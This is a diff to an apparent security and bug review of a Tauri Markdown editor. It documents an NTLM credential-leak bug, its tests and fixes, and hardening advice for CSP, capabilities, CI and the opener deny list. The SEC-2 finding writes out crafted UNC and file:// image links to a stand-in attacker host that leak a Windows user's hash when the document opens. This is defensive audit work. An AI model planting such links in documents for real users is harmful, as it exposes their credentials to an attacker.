@@ -215,7 +215,7 @@ PREV-1 to PREV-5 are fixed (see 2.3). Their tests are in `src/editor/livePreview
 - **Cause:** `joinBase` in `src/editor/livePreview/context.ts` joins any non-absolute path to the base. `classifyHref` in `src/state/logic.ts` uses `rootOf(baseDir)`.
 - **Fix:** pick one rule (the drive or share root, as for links) and use it in both places.
 
-#### PREV-9. Print still loads images from another computer's share 📖
+#### PREV-9. Print still loads images from another computer's share 📖 — fixed in the merge of the security review (shares the PREV-3 check)
 - This is the same problem as PREV-3, which is fixed for the live preview only.
 - **Cause:** `safeImageSrc` in `src/lib/print.ts` passes `file://server/...` and `\\server\...` to `convertFileSrc`. Printing a downloaded note then sends the user's NTLM credentials to that server.
 - **Fix:** move `networkHost` from `context.ts` to `src/state/logic.ts`, and apply the same rule in `print.ts`.
@@ -238,6 +238,38 @@ PREV-1 to PREV-5 are fixed (see 2.3). Their tests are in `src/editor/livePreview
 - **Test gaps:**
   - IME composition inside a cell. CodeMirror ignores the composition events because `TableWidget.ignoreEvent` returns true, and `render` leaves the active cell's DOM alone while its text matches. This was checked by reading only, so it needs a WebView2 check with the Urdu and Chinese IMEs.
   - A cell being edited while an external reload (`resetDoc`) or Replace All changes the table. Both were checked by reading only: focus is lost on reload, which is acceptable.
+
+## Review: security and configuration
+
+Threat model: the user opens an untrusted Markdown or text file. Checked: HTML, KaTeX, Mermaid and the print sanitiser, links and the opener, images and the CSP, paths in links, drafts and session keys, the IPC commands, the updater, the installer hooks, CI, and the dependencies.
+
+**Result:** a crafted document cannot run script. The CSP has `script-src 'self'` with no inline scripts. Live preview never renders raw HTML. Table cells allow only attribute-free tags. KaTeX runs with `trust: false` and Mermaid with `securityLevel: "strict"`. Print uses an allow-list inside an inert `<template>`. Links never navigate the webview. Draft ids and session keys are checked in Rust (`store.rs` `check_id`). `npm audit` finds nothing. `cargo audit` finds no vulnerabilities, only "unmaintained" warnings on Linux-only crates (glib, zbus) and on chrono and proc-macro-error. The updater checks the minisign signature over HTTPS, and Tauri only installs a newer version.
+
+### Bugs
+
+#### SEC-2. Opening a document makes Windows send the user's NTLM hash to any server the document names 📖 — images fixed (PREV-3 for the editor, PREV-9 for print); links still open by click
+- **Input:** a `.md` file containing `![](\\evil.example\s\x.png)`, `![](file://evil.example/s/x.png)` or `![[\\evil.example\s\x.png]]`, opened in Formatted mode (the default for `.md`). Printing such a file does the same for `<img src="\\evil.example\...">`.
+- **Actual:** the image is requested as soon as it is shown. Nothing has to be clicked.
+  - `resolveImageSrc` (`src/editor/livePreview/context.ts:41`, `joinBase` accepts `\\` paths) and `safeImageSrc` (`src/lib/print.ts:36`) pass the UNC path to `convertFileSrc`.
+  - The asset protocol (scope `"**"` in `tauri.conf.json`) then canonicalises and opens it.
+  - Windows connects to the host over SMB, or WebDAV over port 80 when SMB is blocked, and sends the user's NTLMv2 hash. This is a well-known credential-leak class.
+  - Clicking a link to `\\host\...` does the same, but needs a click.
+- **Expected:** a document can load images only from local drives and from the network host the document itself is on.
+- **Tests:** "SEC-2: ..." in `src/editor/livePreview/livePreview.test.ts` and `src/lib/print.test.ts` now run and pass (`mayLoadImageFrom` in `src/editor/livePreview/context.ts`, used by the preview and by print).
+- **Still open:** a click on a link to `\\host\...` still reaches that host; a "click to load" for blocked images is not done.
+- **Suggested fix:**
+  - In `resolveImageSrc` and `safeImageSrc`, refuse an absolute UNC path or `file://host/` whose host differs from the host of the document's own folder (`baseDir`). Show the image placeholder with "Blocked: network image" and a click to load it.
+  - Refuse `\\?\` and `\\.\` (device) paths outright.
+  - Not fixed here because it changes behaviour for notes that embed images from another share; the owner should decide.
+
+### Improvements
+- **Remote images (privacy):** `http:`/`https:` images load as soon as a file opens, so a document can tell its sender when and from which IP it was read. Consider a setting "Load remote images" (on, or "ask per document" as mail clients do). `img-src ... http:` in the CSP also allows plain-HTTP tracking.
+- **Asset protocol scope `"**"`** (`tauri.conf.json`): any local file can be loaded as an image or media by the page. This is harmless while no script can run, but it is wider than needed. A deny list for `\\?\`, `\\.\` and the app's own data folder would limit the damage if script injection is ever found.
+- **Capabilities wider than needed** (`src-tauri/capabilities/default.json`): the frontend does not appear to call `hide`, `set-effects`, `set-background-color`, `set-webview-background-color`, `set-app-theme`, `set-title`, `is-visible` or `is-minimized` (grep of `src/`). Remove them after a check on Windows. Some may be used by Tauri's own drag region or theme code.
+- **CI supply chain:** third-party actions are pinned to moving tags (`tauri-apps/tauri-action@v0`, `swatinem/rust-cache@v2`, `dtolnay/rust-toolchain@stable`). `release.yml` runs with `contents: write` and the updater signing key, so pin these to commit SHAs and let Dependabot update them.
+- **CI audit:** add `npm audit --omit=dev` and `cargo audit` (or `cargo deny`) jobs.
+- **Legacy Office types:** `EXTERNAL_EXTENSIONS` (`src/state/logic.ts`) sends `.doc`, `.xls` and `.ppt` (formats that can hold macros) to their default app. With a UNC path (SEC-2) such a file can come straight from a remote server. Fixing SEC-2 for links too (same-host rule) covers this.
+- **WebView2 flag:** `additionalBrowserArgs` turns off `msSmartScreenProtection`. This is fine while the webview never navigates, but add a comment saying why, so it is not copied to a setup that does navigate.
 
 ---
 
@@ -349,6 +381,8 @@ PREV-1 to PREV-5 are fixed (see 2.3). Their tests are in `src/editor/livePreview
 | PREV-3 | Showing a document with `![](\\server\x.png)` (or `file://server/…`, `//server/…`) made Windows send the user's NTLM credentials to that server | Network images load only from the document's own server | `c393e1f` |
 | PREV-4 | `` `a \| b` `` in a table cell showed the backslash | `\|` is unescaped before code spans are taken out, as in GFM | `3131e22` |
 | PREV-5 | A NUL character followed by digits and NUL in a cell showed "undefined" | NUL is shown as U+FFFD | `f82320c` |
+| SEC-1 | A form feed in an untitled tab's name ended the print header's CSS string early, so the rest of the name was read as CSS | Every control character becomes a space in `cssString` (`src/state/logic.ts`) | `f750a81` |
+| 1.6 | `opener:allow-open-path` allowed every path, so only the frontend kept a link from launching a program | The capability denies 107 program, script, shortcut, installer and macro types. Scripts still open as text in a tab. `src/state/openerScope.test.ts` checks that no denied type is ever sent to `openPath` | `2893fc5` |
 
 ## 2.4 Features added
 
